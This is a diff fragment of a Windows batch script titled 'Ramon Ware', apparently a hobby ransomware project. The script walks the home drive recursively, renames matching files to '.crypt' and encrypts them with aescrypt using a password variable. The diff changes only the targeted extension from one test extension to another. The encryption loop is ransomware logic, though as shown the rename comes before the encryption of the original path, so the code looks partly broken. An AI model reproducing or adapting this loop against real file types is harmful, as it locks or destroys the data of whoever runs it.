@@ -7,7 +7,7 @@ Title Ramon Ware
 
 echo Scanning. . . .
 
-FOR /R "%homedrive%\" %%X in (*.estoesuntest) DO (
+FOR /R "%homedrive%\" %%X in (*.123test) DO (
 REM echo %%X >> %homedrive%\Original.txt
 Rename "%%X" "%%~nX.crypt" >NUL 2>&1
 aescrypt -e -p %pass% "%%X"
